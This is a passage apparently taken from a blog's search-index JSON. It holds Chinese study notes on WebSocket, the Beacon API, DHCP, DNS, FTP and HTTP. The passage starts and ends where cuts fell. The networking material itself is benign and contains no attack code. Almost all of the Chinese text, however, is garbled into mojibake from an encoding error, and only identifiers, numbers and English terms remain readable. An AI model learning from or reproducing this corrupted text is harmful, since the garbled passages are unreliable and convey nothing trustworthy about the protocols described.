å…¥ä¸€ä¸ªç»å¯¹URLã€‚ä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œå¯ä»¥æ‰“å¼€åˆ°ä»»æ„ç«™ç‚¹çš„è¿æ¥ï¼Œè‡³äºæ˜¯å¦æ¥è‡ªäºç‰¹å®šæºçš„é¡µé¢é€šä¿¡ï¼Œå®Œå…¨å–å†³äºæœåŠ¡å™¨ã€‚â€‹\tåˆ›å»º Web Socket æ—¶ï¼Œä¸€ä¸ª HTTP è¯·æ±‚ä¼šå‘é€åˆ°æœåŠ¡å™¨ä»¥å»ºç«‹åˆå§‹åŒ–è¿æ¥ï¼Œå»ºç«‹æˆåŠŸåï¼ŒHTTP ä¸­çš„Upgradeå¤´éƒ¨åè®®åˆ‡æ¢åˆ°  Web Socket åè®®ï¼ŒURLä½¿ç”¨ws:// å’Œ wss://ï¼Œä¸”åœ¨æŒ‡å®š  Web Socket URLå¿…é¡»åŒ…å«URLæ–¹æ¡ˆã€‚WebSocket å±æ€§ã€æ–¹æ³•ã€äº‹ä»¶ğŸˆå±æ€§`\twebSocket.readyState` å±æ€§æ ‡è¯†å½“å‰è¿æ¥çš„çŠ¶æ€ï¼š      WebSocket.OPENING â€”- 0ï¼š æ­£åœ¨å»ºç«‹è¿æ¥        WebSocket.OPEN â€”â€“ 1ï¼šè¿æ¥å·²ç»å»ºç«‹    ï¼ˆsocket.close()ï¼Œå…³é—­è¿æ¥ï¼Œä»»ä½•æ—¶å€™éƒ½å¯ä»¥è°ƒç”¨ï¼‰        WebSocket.CLOSING â€”- 2 ï¼šæ­£åœ¨å…³é—­è¿æ¥        WebSocket.CLOSE â€”- 3ï¼šè¿æ¥å·²ç»å…³é—­  ğŸˆæ–¹æ³•socket.send(String/ArrayBuffer/Blob)ï¼š å‘æœåŠ¡å™¨å‘é€æ•°æ®socket.message = function(event)ï¼š æ¥æ”¶æœåŠ¡å™¨æ¶ˆæ¯  æœ‰æ•ˆè·è½½å­˜æ”¾åœ¨ event.data ä¸­  WebSocket.binaryType = blob/arraybufferï¼Œè¡¨ç¤ºæ•°æ®å¯ä»¥æ˜¯Blob/ArrayBufferğŸˆäº‹ä»¶      openï¼šè¿æ¥æˆåŠŸæ—¶è§¦å‘        errorï¼šå‘é€é”™è¯¯æ—¶è§¦å‘ï¼Œè¿æ¥æ— æ³•å­˜ç»­        closeï¼šè¿æ¥å…³é—­æ—¶è§¦å‘ã€‚äº‹ä»¶eventå¯¹è±¡æœ‰é¢å¤–ä¿¡æ¯ï¼š          wasClean è¡¨ç¤ºè¿æ¥æ˜¯å¦å¹²å‡€å…³é—­ï¼›      code æœåŠ¡å™¨æ•°æ®çŠ¶æ€ç ï¼›      reason å­—ç¬¦ä¸²ï¼ŒåŒ…å«æœåŠ¡å™¨ä¼ æ¥çš„æ¶ˆæ¯        WebSocket å¯¹è±¡ä¸æ”¯æŒ DOM Level 2 äº‹ä»¶ç›‘å¬ã€‚éœ€è¦ä½¿ç”¨ DOM0 äº‹ä»¶å¤„ç†ç¨‹åºã€‚  Beacon APIâ€‹\tä¸ºä¿è¯æŸäº›å·¥å…·è„šæœ¬èƒ½å¤Ÿåœ¨é¡µé¢ç”Ÿå‘½å‘¨æœŸä¸­å°½é‡æ™šåœ°å‘æœåŠ¡å™¨å‘é€é¥æµ‹æˆ–åˆ†ææ•°æ® â€”â€” æœ€å¥½çš„æ—¶æœºæ˜¯é¡µé¢å¸è½½æ—¶ onunloadï¼Œæ­¤æ—¶ç”¨æˆ·ç¦»å¼€é¡µé¢ï¼Œä¹Ÿæ„å‘³ç€ä¸ä¼šå†äº§ç”Ÿæ–°çš„è¡Œä¸ºæ•°æ®ï¼›ä½†æ­¤æ—¶ å¼‚æ­¥XMLHttpRequest æˆ– Fetch å¹¶ä¸é€‚åˆè¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºæµè§ˆå™¨å¸è½½é¡µé¢æ—¶ä¼šå–æ¶ˆä»»ä½•å¼‚æ­¥è¯·æ±‚ â€”â€” W3C æå‡º Beacon APIã€‚// navigator.sendBeacon( URL, æ•°æ®æœ‰æ•ˆè´Ÿè½½ ï¼‰ï¼Œå‘é€POSTè¯·æ±‚// æ•°æ®æœ‰æ•ˆè´Ÿè½½ç±»å‹ï¼Œå¯ä»¥æ˜¯ Arrayã€Blobã€DOMStringã€FormData// è¿”å›å€¼ï¼štrue æˆåŠŸè¿›å…¥æœ€ç»ˆå‘é€çš„ä»»åŠ¡é˜Ÿåˆ—ï¼›falsenavigator.sendBeacon('https:// ...', '{foo:\"bar\"}');â€‹\tsendBeacon()ä¸ä»…åœ¨é¡µé¢ç”Ÿå‘½å‘¨æœŸæœ«å°¾ä½¿ç”¨ï¼Œä»»ä½•æ—¶å€™éƒ½å¯ä»¥ä½¿ç”¨ï¼›â€‹\tæµè§ˆå™¨ä¿è¯åŸå§‹é¡µé¢å·²ç»å…³é—­æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šå‘é€è¯·æ±‚ï¼›â€‹\tBeaconï¼ˆä¿¡æ ‡ï¼‰è¯·æ±‚ä¼šæºå¸¦è°ƒç”¨sendBeacon()æ—¶æ‰€æœ‰ç›¸å…³çš„cookie"
  },
  
  {
    "title": "6.ç½‘ç»œå±‚",
    "url": "/posts/6.%E7%BD%91%E7%BB%9C%E5%B1%82/",
    "categories": "è®¡ç®—æœºç½‘ç»œ",
    "tags": "computerNetwork",
    "date": "2022-06-18 00:00:00 +0800",
    





    
    "snippet": "â€‹\tç½‘ç»œä½“ç³»ç»“æ„çš„æœ€é¡¶å±‚ï¼Œäº«å—ä¸‹å±‚æä¾›çš„æœåŠ¡ï¼Œæ— è§†ä¸‹å±‚å…·ä½“æ“ä½œæ´»åŠ¨ï¼›â€‹\té€šè¿‡åº”ç”¨è¿›ç¨‹çš„äº¤äº’ï¼Œå®ç°ç‰¹å®šç½‘ç»œåº”ç”¨çš„é—®é¢˜ï¼›â€‹\tæ˜¯è®¾è®¡å’Œå»ºç«‹è®¡ç®—æœºç½‘ç»œçš„æœ€ç»ˆç›®çš„C/S å’Œ P2PC/Så®¢æˆ· / æœåŠ¡å™¨ï¼ˆClient/Serverï¼‰  å®¢æˆ·ï¼šæ˜¯è®¡ç®—æœºã€æ˜¯è¿›ç¨‹ï¼Œæ˜¯æœåŠ¡è¯·æ±‚æ–¹  æœåŠ¡å™¨ï¼š          æ˜¯è®¡ç®—æœºã€æ˜¯è¿›ç¨‹ï¼Œæ˜¯æœåŠ¡æä¾›æ–¹      æ€»æ˜¯å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·è¯·æ±‚      å…·æœ‰å›ºå®šçš„ç«¯å£å·...",
    "content": "â€‹\tç½‘ç»œä½“ç³»ç»“æ„çš„æœ€é¡¶å±‚ï¼Œäº«å—ä¸‹å±‚æä¾›çš„æœåŠ¡ï¼Œæ— è§†ä¸‹å±‚å…·ä½“æ“ä½œæ´»åŠ¨ï¼›â€‹\té€šè¿‡åº”ç”¨è¿›ç¨‹çš„äº¤äº’ï¼Œå®ç°ç‰¹å®šç½‘ç»œåº”ç”¨çš„é—®é¢˜ï¼›â€‹\tæ˜¯è®¾è®¡å’Œå»ºç«‹è®¡ç®—æœºç½‘ç»œçš„æœ€ç»ˆç›®çš„C/S å’Œ P2PC/Så®¢æˆ· / æœåŠ¡å™¨ï¼ˆClient/Serverï¼‰  å®¢æˆ·ï¼šæ˜¯è®¡ç®—æœºã€æ˜¯è¿›ç¨‹ï¼Œæ˜¯æœåŠ¡è¯·æ±‚æ–¹  æœåŠ¡å™¨ï¼š          æ˜¯è®¡ç®—æœºã€æ˜¯è¿›ç¨‹ï¼Œæ˜¯æœåŠ¡æä¾›æ–¹      æ€»æ˜¯å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·è¯·æ±‚      å…·æœ‰å›ºå®šçš„ç«¯å£å·ï¼Œä¸»æœºæœ‰å›ºå®šçš„IPåœ°å€        æœåŠ¡é›†ä¸­å‹          åº”ç”¨æœåŠ¡é›†ä¸­ æ¯”å®¢æˆ·ç«¯å°‘å¾—å¤šçš„ æœåŠ¡å™¨ä¸Š      å¸¸ä¼šå‡ºç°æœåŠ¡å™¨è·Ÿä¸ä¸Šå®¢æˆ·ç«¯è¯·æ±‚çš„æƒ…å†µ      è®¡ç®—æœºç¾¤é›†ï¼ˆæœåŠ¡å™¨åœºï¼‰æ„å»ºä¸€ä¸ªå¼ºå¤§çš„è™šæ‹ŸæœåŠ¡å™¨      P2På¯¹ç­‰æ–¹å¼ ï¼ˆ Peer - to - Peerï¼‰  æ²¡æœ‰å›ºå®šçš„è¯·æ±‚è€…å’Œæä¾›è€…ï¼Œåº”ç”¨è¿›ç¨‹å¯¹ç­‰ã€ç›´æ¥é€šä¿¡  æœåŠ¡åˆ†æ•£å‹          å¤§é‡å¯¹ç­‰è®¡ç®—æœºéƒ½æ˜¯æœåŠ¡çš„æä¾›å’Œè¯·æ±‚è€…      å¯æ‰©å±•æ€§ï¼šä¸ä¼šå› ä¸ºè§„æ¨¡æ‰©å¤§è€Œå‡ä½ç³»ç»Ÿæ€§èƒ½        ç”¨æˆ·è¶Šå¤šï¼Œé€Ÿåº¦è¶Šå¿«ï¼›æˆæœ¬ä¼˜åŠ¿DHCPâ€‹\tåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼Œåˆç§°ä¸ºå³æ’å³ç”¨ç½‘ç»œã€‚â€‹\tå…è®¸ä¸€å°è®¡ç®—æœºåŠ å…¥æ–°ç½‘ç»œæ—¶ï¼Œå¯ä»¥è‡ªåŠ¨è·å–IPåœ°å€ç­‰ç½‘ç»œé…ç½®ä¿¡æ¯è€Œä¸ç”¨æ‰‹å·¥é…ç½®ã€‚â€‹\tTCP/IPçš„åº”ç”¨å±‚åè®®ï¼Œä½¿ç”¨UDPä¼ è¾“â€‹\tDHCP\tæœåŠ¡å™¨çš„ç«¯å£67ï¼›å®¢æˆ·ç«¯çš„ç«¯å£68å·¥ä½œè¿‡ç¨‹      *discover ** *å¯»æ‰¾æœåŠ¡å™¨    å®¢æˆ·ç«¯ å‘é€UDPç”¨æˆ·æ•°æ®æŠ¥ï¼ŒåŒ…å«DHCPå‘ç°æŠ¥æ–‡ï¼›          ç›®çš„åœ°å€255.255.255.255ï¼šä¸çŸ¥é“å½“å‰ç½‘ç»œä¸­æœ‰å¤šå°‘ä¸ªDHCPæœåŠ¡ç«¯ï¼Œå’Œä»–ä»¬å…·ä½“çš„IP      æºåœ°å€0.0.0.0ï¼šå½“å‰ä¸»æœºæœªåˆ†é…åˆ°IPåœ°å€      ç›®çš„ç«¯å£å·67ï¼šéDHCPæœåŠ¡å™¨ä¸ç›‘è§†è¯¥ç«¯å£ï¼Œæ”¶åˆ°ä½†ä¸¢å¼ƒï¼›ä»…DHCPæœåŠ¡å™¨ä½œå‡ºå›å¤      æ•°æ®åŸŸå°è£…æœ‰ äº‹åŠ¡ID + DHCPå®¢æˆ·ç«¯çš„MACåœ°å€            Offer æä¾›ä¸€å¥—æ–¹æ¡ˆ    DHCPæœåŠ¡å™¨æ”¶åˆ°è¯¥æŠ¥æ–‡ï¼Œ          æ‹†åˆ†ã€æŸ¥æ‰¾æ˜¯å¦æœ‰é’ˆå¯¹å…¶MACåœ°å€çš„é…ç½®ä¿¡æ¯                  æœ‰ï¼šå°†è¯¥é…ç½®ä¿¡æ¯å°è£… â†’ DHCPæä¾›æŠ¥æ–‡          æ— ï¼šé»˜è®¤é…ç½®ä¿¡æ¯å°è£… â†’ DHCPæä¾›æŠ¥æ–‡                    å°è£…å›å¤æŠ¥æ–‡                  ç›®çš„åœ°å€ï¼š255.255.255.255ï¼Œç›®æ ‡è®¾å¤‡æœªåˆ†é…åˆ°IPåœ°å€          æºåœ°å€ï¼šDHCPæœåŠ¡å™¨åœ°å€          ç›®çš„ç«¯å£å·68ï¼šéDHCPå®¢æˆ·ç«¯ä¸ç›‘è§†è¯¥æ¥å£ï¼Œæ”¶åˆ°ä½†ä¸¢å¼ƒï¼›ä»…DHCPå®¢æˆ·ç«¯ä½œå‡ºå›å¤                          Request ç¡®è®¤é€‰æ‹©æŸä¸€å¥—æ–¹æ¡ˆ    å®¢æˆ·ç«¯æ”¶åˆ°å›å¤ï¼š          æ ¹æ®æŠ¥æ–‡ä¸­çš„äº‹åŠ¡IDåˆ¤æ–­æ˜¯å¦æ˜¯è‡ªå·±æ‰€è¯·æ±‚çš„æŠ¥æ–‡      é…ç½®ä¿¡æ¯åŒ…æ‹¬ï¼šIPåœ°å€ï¼ˆä½¿ç”¨ARPæ£€æµ‹ç¡®ä¿è¯¥IPæœªè¢«ç½‘ç»œä¸­çš„å…¶ä»–ä¸»æœºå ç”¨ï¼‰ã€å­ç½‘æ©ç ã€åœ°å€ç§ŸæœŸã€é»˜è®¤ç½‘å…³ã€DNSæœåŠ¡å™¨      æŒ‘é€‰ä¸€ä¸ªï¼ˆå…ˆåˆ°çš„ï¼‰æŠ¥æ–‡ä½œä¸ºè‡ªå·±çš„DHCPï¼Œå‘é€ DHCPè¯·æ±‚æŠ¥æ–‡å¾æ±‚å…¶åŒæ„ï¼š                  ç›®çš„åœ°å€255.255.255.255ï¼šå‘ŠçŸ¥æ‰€æœ‰çš„DHCPï¼Œæˆ‘æŒ‘é€‰åˆ°å®ƒå•¦          æºåœ°å€0.0.0.0ï¼šç°åœ¨æœªè·å¾—DHCPæœåŠ¡å™¨çš„åŒæ„          æŠ¥æ–‡å†…å®¹ï¼šäº‹åŠ¡IDã€DHCPå®¢æˆ·ç«¯çš„MACåœ°å€ã€æ¥å—ç§Ÿçº¦çš„IPåœ°å€ã€æä¾›ç§Ÿçº¦çš„DHCPæœåŠ¡ç«¯IPåœ°å€ç­‰                          ACK æœ€ç»ˆç¡®è®¤    æœåŠ¡ç«¯å›å¤æ˜¯å¦åŒæ„ç§Ÿçº¦          ç›®çš„åœ°å€ï¼š255.255.255.255      æºåœ°å€ï¼šDHCPæœåŠ¡å™¨            å®¢æˆ·ç«¯æ”¶åˆ°ç¡®è®¤åï¼Œä½¿ç”¨ARPæ£€æµ‹æ‰€åˆ†é…çš„IPåœ°å€æ˜¯å¦è¢«ç½‘ç»œå…¶ä»–ä¸»æœºå ç”¨          è‹¥æœªè¢«å ç”¨ï¼Œå®¢æˆ·ç«¯å¯ä»¥å¼€å§‹ä½¿ç”¨è¯¥IPåœ°å€      è‹¥è¢«å ç”¨ï¼Œ                  ç»™DHCPæœåŠ¡å™¨å‘é€ DHCP declineæŠ¥æ–‡æ’¤é”€IPåœ°å€ç§Ÿçº¦          é‡å‘ DHCP discoveræŠ¥æ–‡å¯»æ‰¾æ–¹æ¡ˆ                          ç»­çº¦ å½“ç§ŸæœŸè¿‡åŠæ—¶                  å®¢æˆ·ç«¯è¯·æ±‚ç»­çº¦ DHCP request                  æºåœ°å€ï¼šç§Ÿç”¨çš„åœ°å€          ç›®çš„åœ°å€ï¼šDHCPæœåŠ¡å™¨                    æœåŠ¡å™¨ä¸åŒçš„ååº”                  è‹¥åŒæ„ç»­çº¦ DHCP ACKï¼Œå¾—åˆ°æ–°çš„ç§ŸæœŸ          è‹¥ä¸åŒæ„ç»­çº¦ DHCP NACKï¼Œå®¢æˆ·ç«¯å¿…é¡»ç«‹å³åœç”¨ç§Ÿç”¨çš„IPåœ°å€å¹¶é‡æ–°å‘é€ DHCP discover          è‹¥ä¸å“åº”ï¼Œå®¢æˆ·ç«¯ç­‰å¾…ä¸€æ®µæ—¶é—´                    ç­‰å¾…åˆ°0.875 = 7/8çš„ç§ŸæœŸæ—¶é—´ï¼Œå®¢æˆ·ç«¯å¿…é¡»é‡æ–°å‘é€ ç»­çº¦ DHCP request      ç­‰å¾…åˆ°ç§ŸæœŸç»“æŸï¼Œå®¢æˆ·ç«¯å¿…é¡»åœç”¨ç§Ÿç”¨çš„IPåœ°å€å¹¶é‡æ–°å‘é€ DHCP discover            è§£çº¦ å®¢æˆ·ç«¯å¯ä»¥éšæ—¶æ”¾å¼ƒç§Ÿç”¨çš„IPåœ°å€ï¼Œå‘æä¾›DHCPæœåŠ¡å™¨å‘é€ DHCP releaseé‡Šæ”¾æŠ¥æ–‡å³å¯  ä¸­ç»§ä»£ç†â€‹\tæŸä¸ªç½‘ç»œæ‹“æ‰‘ä¸­æ²¡æœ‰DHCPæœåŠ¡å™¨ï¼Œå…¶å®¢æˆ·ç«¯æ³•å‘é€çš„ DHCP discoverè¯·æ±‚ä½¿ç”¨å¹¿æ’­åœ°å€255.255.255.255ä¸èƒ½ç»è¿‡æ™®é€šè·¯ç”±å™¨è½¬å‘è€Œæ˜¯ä¸¢å¼ƒï¼Œå†…éƒ¨åˆæ²¡æœ‰å¯ä»¥ç›¸åº”å…¶DHCPè¯·æ±‚çš„æœåŠ¡ï¼Œå¯¼è‡´è¯¥ç½‘ç»œæ‹“æ‰‘ä¸­çš„ä¸»æœºæ— æ³•è‡ªåŠ¨è·å–ç½‘ç»œé…ç½®ä¿¡æ¯ã€‚â€‹\tè§£å†³åŠæ³•ï¼Œä¸ºè¯¥è·¯ç”±å™¨é…ç½®DHCPæœåŠ¡å™¨çš„IPåœ°å€ä½¿ä¹‹æˆä¸º DHCPä¸­ç»§ä»£ç†â€‹\tè·¯ç”±å™¨æ”¶åˆ°å¹¿æ’­çš„DHCP discoveræŠ¥æ–‡åï¼Œä¼šå•æ’­è½¬å‘ç»™å…¶ä»–ç½‘ç»œæ‹“æ‰‘ä¸­å­˜åœ¨çš„DHCPæœåŠ¡å™¨ï¼Œæ­¤åéƒ½å¦‚æ­¤äº¤äº’â€‹\tä½¿æ¯ä¸ªç½‘ç»œä¸å¿…éƒ½é…ç½®DHCPæœåŠ¡å™¨ï¼Œè‡³å°‘æœ‰ä¸€ä¸ªå³å¯DNSâ€‹\tåŸŸåç³»ç»Ÿï¼ˆDomain Name Systemï¼‰ï¼Œå°†åŸŸåç¿»è¯‘ä¸ºIPåœ°å€å¯»å€â€‹\tæ¯å°ç”¨æˆ·ä¸»æœºéƒ½éœ€è¦ç»è¿‡DNSæŸ¥æ‰¾åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œæ•…DNSæœåŠ¡å™¨ä¸èƒ½åªæœ‰ä¸€å°ï¼Œå®ƒåº”è¯¥åœ¨æœ¬åœ°è§£ææˆ–ä¸€ä¸ªåˆ†å¸ƒå¼æœåŠ¡å™¨é›†ç¾¤â€‹\tå› ç‰¹ç½‘ä½¿ç”¨å±‚æ¬¡ç»“æ„å‘½åæ ‘ + åˆ†å¸ƒå¼åŸŸåç³»ç»Ÿï¼Œå¤§å¤šæ•°åŸŸååœ¨æœ¬åœ°è§£æåŸŸåç©ºé—´â€‹\t1. å„çº§åŸŸåï¼šç”±è‹¥å¹²ä¸ªåˆ†é‡ï¼Œä»¥.éš”å¼€ï¼Œåˆ†åˆ«ä»£è¡¨ä¸åŒçº§åˆ«çš„åŸŸåâ€‹\t\tæ¯ä¸€çº§åŸŸåï¼ˆ&lt; 63ä¸ªå­—ç¬¦ï¼‰æœ‰ è‹±æ–‡ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ + æ•°å­— ï¼Œå®Œæ•´åŸŸå &lt; 255ä¸ªå­—ç¬¦â€‹\t\tÂ·Â·Â·.ä¸‰çº§åŸŸå.äºŒçº§åŸŸå.é¡¶çº§åŸŸå å³è¾¹å¤§ï¼Œå„çº§åŸŸåç”±å…¶ä¸Šçº§æœºæ„ç®¡ç†ï¼›é¡¶çº§åŸŸåç”±å› ç‰¹ç½‘åç§°ä¸æ•°å­—åˆ†é…æœºæ„ICMNç®¡ç†  é¡¶çº§åŸŸåTLDï¼ˆTop Level Domainï¼‰åˆ†ä¸ºä¸‰ç±»          å›½å®¶é¡¶çº§åŸŸånTLDï¼šISO 3166è§„å®š      é€šç”¨é¡¶çº§åŸŸågTLDï¼šå¸¸è§ä¸ƒä¸ªï¼ˆcomå…¬å¸ä¼ä¸šã€netç½‘ç»œæœåŠ¡æœºæ„ã€orgéè¥åˆ©æ€§ç»„ç»‡ã€intå›½é™…ç»„ç»‡ã€eduç¾å›½æ•™è‚²æœºæ„ã€govç¾å›½æ”¿åºœéƒ¨é—¨ã€milç¾å›½å†›äº‹éƒ¨é—¨ï¼‰      åå‘åŸŸåarpaï¼šç”¨ä»¥åå‘åŸŸåè§£æï¼Œå³IPåœ°å€ â†’ åŸŸå        äºŒçº§åŸŸå          ç”±å›½å®¶è‡ªè¡Œè§„å®š      åˆ†ä¸ºä¸¤ç±»                  ç±»åˆ«åŸŸåï¼šä¸ƒä¸ªï¼ˆacç§‘ç ”æœºæ„ã€comå·¥å•†é‡‘èç­‰ä¼ä¸šã€eduæ•™è‚²æœºæ„ã€govæ”¿åºœéƒ¨é—¨ã€netæä¾›ç½‘ç»œæœåŠ¡æœºæ„ã€milå†›äº‹æœºæ„ã€orgéç›ˆåˆ©ç»„ç»‡ï¼‰          è¡Œæ”¿åŒºåŸŸåï¼š34ä¸ªï¼Œåˆ†é…ç»™å„çœã€è‡ªæ²»åŒºã€ç›´è¾–å¸‚                      ä¾¿äºç»´æŠ¤åå­—çš„å”¯ä¸€æ€§ï¼Œæ˜“æŸ¥è¯¢ï¼›é€»è¾‘æ¦‚å¿µï¼Œè€Œéç‰©ç†åœ°ç‚¹åŸŸåæœåŠ¡å™¨â€‹\tåˆ†å¸ƒå¼å®ç°  æ ¹ åŸŸåæœåŠ¡å™¨          åˆ†å¸ƒå¼æ„æˆçš„13ä¸ªæ ¹åŸŸåæœåŠ¡å™¨ï¼Œæ˜¯é«˜å±‚çš„åŸŸåæœåŠ¡å™¨      ä¸ç›´æ¥å¯¹åŸŸåè§£æï¼Œè€Œæ˜¯æä¾›è¯¥åŸŸåæ‰€åœ¨çš„ é¡¶çº§æœåŠ¡å™¨IPåœ°å€        é¡¶çº§ åŸŸåæœåŠ¡å™¨          ç®¡ç†è¯¥é¡¶çº§åŸŸåä¸‹çš„ äºŒçº§åŸŸå      è¿”å›ä¸‹ä¸€çº§æƒé™æœåŠ¡å™¨çš„IPåœ°å€        æƒé™ åŸŸåæœåŠ¡å™¨          ç®¡ç†æŸä¸ªåŒºçš„åŸŸåï¼Œä¸»æœºå¿…é¡»æ‰€ç®¡è¾–æœåŠ¡å™¨æ³¨å†Œç™»è®°      ç®¡è¾–çš„åŸŸåä¸IPåœ°å€çš„æ˜ å°„å…³ç³»ï¼›ä¸‹çº§æœåŠ¡å™¨çš„åœ°å€        æœ¬åœ° åŸŸåæœåŠ¡å™¨          ä¸»æœºç¬¬ä¸€ä¸ªç»è¿‡çš„åŸŸåæœåŠ¡å™¨ï¼Œèµ·ç€ä»£ç®¡ä½œç”¨ï¼Œå¯¹å…¶è½¬å‘      è·ç¦»ä¸»æœºè·ç¦»è¾ƒè¿‘ï¼Œä¸€èˆ¬å››äº”ä¸ªè·¯ç”±å™¨      åŸŸåè§£æè§£æè¿‡ç¨‹      é€’å½’æŸ¥è¯¢    ç›´æ¥ä¸€çº§ä¸€çº§å‘ä¸‹æŸ¥è¯¢ï¼Œæœ¬åœ° â€“ æ ¹ â€“ é¡¶çº§ â€“ æƒé™ï¼Œè·å¾—ç»“æœå°±å¾€å›ä¼ é€’        è¿­ä»£æŸ¥è¯¢    æ¯å‘ä¸€èŠ‚æŸ¥è¯¢ï¼Œæ‹¿ç€ç»“æœï¼Œå‘å¦ä¸€çº§æŸ¥è¯¢ã€‚    æœ¬åœ° â€“ è·Ÿ = é¡¶çº§IPï¼›æœ¬åœ° â€“ é¡¶çº§IP = æƒé™IPï¼›æœ¬åœ° â€“ æƒé™ = ç›®æ ‡IPï¼›æœ¬åœ°æœåŠ¡å™¨å°†ç›®æ ‡IPäº¤ç»™ä¸»æœº  é€’å½’æŸ¥è¯¢å¯¹è¢«æŸ¥è¯¢çš„åŸŸåæœåŠ¡å™¨è´Ÿè½½è¦æ±‚å¤§ï¼Œæ‰€ä»¥é‡‡ç”¨ä¸¤è€…ç›¸ç»“åˆï¼š  ä¸»æœº â€“ æœ¬åœ°ï¼šé€’å½’æŸ¥è¯¢  æœ¬åœ° â€“ å…¶ä½™æœåŠ¡å™¨ï¼šè¿­ä»£æŸ¥è¯¢è§£æåŸç†ï¼ˆï¼Ÿï¼‰DNSæŒ‡é’ˆæŸ¥è¯¢ï¼ˆåå‘æŸ¥æ‰¾ã€é€†å‘è§£æï¼‰çš„åŸºæœ¬åŸç†DNSç¼“å­˜â€‹\tä¸ºæé«˜æŸ¥è¯¢æ•ˆç‡ï¼Œå‡å°‘æŸ¥è¯¢æŠ¥æ–‡æ•°é‡ï¼Œå‡è½»æœåŠ¡å™¨è´Ÿè·â€‹\tåŸŸåæœåŠ¡å™¨å¹¿æ³›ä½¿ç”¨ é«˜é€Ÿç¼“å­˜ï¼Œå­˜æ”¾æœ€è¿‘æŸ¥è¯¢è¿‡çš„åŸŸåã€ä½•å¤„è·å–çš„åŸŸåæ˜ å°„ä¿¡æ¯è®°å½•â€‹\tæœ¬åœ°ä¸»æœºä¹Ÿéœ€è¦ç»´æŠ¤å¥½ åŸŸåï¼šIPåœ°å€æ•°æ®åº“â€‹\tç¼“å­˜ä¸ºæ¯é¡¹å†…å®¹è®¾ç½®è®¡æ—¶å™¨ï¼Œå¹¶åˆ é™¤è¶…è¿‡åˆç†æ—¶é—´çš„é¡¹FTPâ€‹\tæ–‡ä»¶ä¼ è¾“åè®®ï¼ˆFile Transfer Protocolï¼‰  äº¤äº’å¼è®¿é—®ï¼Œå…è®¸æŒ‡æ˜æ–‡ä»¶ç±»å‹ä¸æ ¼å¼ã€æ–‡ä»¶å­˜å–æƒé™ï¼ˆæˆæƒã€å£ä»¤ï¼‰  å±è”½è®¡ç®—æœºç³»ç»Ÿç»†èŠ‚ï¼Œé€‚ç”¨äºå¼‚æ„ç½‘ç»œä¸­ä»»æ„è®¡ç®—æœºä¹‹é—´åŸºæœ¬å·¥ä½œåŸç†ä¸¤ç§ä¸åŒçš„ä¼ è¾“æ¨¡å¼ä¸»åŠ¨æ¨¡å¼      æœåŠ¡å™¨ç›‘å¬ ç†ŸçŸ¥ç«¯å£å·21ï¼Œç­‰å¾…å®¢æˆ·å‘èµ·FTPè¿æ¥        æ§åˆ¶è¿æ¥ï¼šå»ºç«‹TCPè¿æ¥ï¼Œç”¨äºä¼ é€FTPç›¸å…³æ§åˆ¶å‘½ä»¤ï¼Œå³å‘½ä»¤é€šé“        å¦‚æœæœ‰æ•°æ®ä¼ è¾“ï¼Œå®¢æˆ·ç«¯é€šè¿‡å‘½ä»¤é€šé“å‘ŠçŸ¥æœåŠ¡å™¨ï¼šéœ€è¦å¼€æ”¾å¦ä¸€æ¡TCPè¿æ¥ï¼Œä½œä¸ºæ•°æ®é€šé“        æ•°æ®è¿æ¥ï¼šæœåŠ¡å™¨å¼€æ”¾ ç†ŸçŸ¥ç«¯å£å·`20`ï¼Œå‘å®¢æˆ·å‘èµ·FTPè¿æ¥ï¼ˆä¸»åŠ¨æ¨¡å¼ï¼‰ï¼Œç”¨äºä¼ è¾“FTPæ–‡ä»¶  è¢«åŠ¨æ¨¡å¼  æ§åˆ¶è¿æ¥ä¸€æ ·  å¦‚æœæœ‰æ•°æ®ä¼ è¾“ï¼Œå®¢æˆ·ç«¯é€šè¿‡å‘½ä»¤é€šé“å‘ŠçŸ¥æœåŠ¡å™¨ï¼šéœ€è¦å¼€æ”¾å¦ä¸€æ¡TCPè¿æ¥ï¼Œä½œä¸ºæ•°æ®é€šé“  æ•°æ®è¿æ¥ï¼šæœåŠ¡å™¨å¼€å¯ ä¸´æ—¶ç«¯å£ï¼ˆåŒæ–¹åå•†å¥½çš„ç«¯å£å·ï¼‰ï¼Œè¢«åŠ¨ç­‰å¾…å®¢æˆ·è¿æ¥ï¼ˆè¢«åŠ¨æ¨¡å¼ï¼‰ï¼Œå»ºç«‹æ•°æ®é€šé“ä¸¤ä¸ªTCPè¿æ¥å¹¶è¡Œï¼šâ€‹\tæ§åˆ¶è¿æ¥éœ€è¦åœ¨ç»˜è¯æœŸé—´ä¸€ç›´ä¿æŒæ‰“å¼€ï¼›â€‹\tæ•°æ®è¿æ¥åœ¨æ¯æ¬¡æ–‡ä»¶ä¼ è¾“æ—¶å»ºç«‹ï¼Œç»“æŸæ—¶ç»“æŸå®¢æˆ·ç«¯çš„æ¥å£éƒ½æ˜¯éšæœºçš„ï¼Ÿ  æ§åˆ¶è¿æ¥ + æ•°æ®è¿æ¥ï¼ˆä¸ºä»€è¦ï¼Ÿ  ä¸¤ç§å·¥ä½œæ¨¡å¼ï¼šPASV + PORT      æŒ‡ä»¤å’Œå“åº”ç     æ–­ç”µç»­ä¼  + åŒ¿åFTPä¸‡ç»´ç½‘WWWâ€‹\tworld wide webï¼Œè¿è¡Œåœ¨Internetä¸­çš„åˆ†å¸ƒå¼åº”ç”¨ï¼Œè€ŒéæŸç§ç‰¹æ®Šçš„è®¡ç®—æœºç½‘ç»œâ€‹\tåˆ©ç”¨è¶…é“¾æ¥ï¼Œå°†ä¸åŒç½‘ç«™çš„ç½‘é¡µè¿æ¥ç»Ÿä¸€èµ„æºå®šä½ç¬¦URLï¼š&lt;åè®®&gt;://&lt;ä¸»æœº&gt;:&lt;ç«¯å£&gt;/&lt;è·¯å¾„&gt;è¿æ¥æ–¹å¼ä¸¤ç§ï¼š  éæŒç»­è¿æ¥          HTTP / 1.0      æ¯æ¬¡è¯·æ±‚å°±å»ºç«‹TCPè¿æ¥ï¼Œæ”¶åˆ°å“åº”åç«‹å³å…³é—­è¿æ¥      è¯·æ±‚ä¸€ä¸ªWWWæ–‡æ¡£æ—¶é—´ 